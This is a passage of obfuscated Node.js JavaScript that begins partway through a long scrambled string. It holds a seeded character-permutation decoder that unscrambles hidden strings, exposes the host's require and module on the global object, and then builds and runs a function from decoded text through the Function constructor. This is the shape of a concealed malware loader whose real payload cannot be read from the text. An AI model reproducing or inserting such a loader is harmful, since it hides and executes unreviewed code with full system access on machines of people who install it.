c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
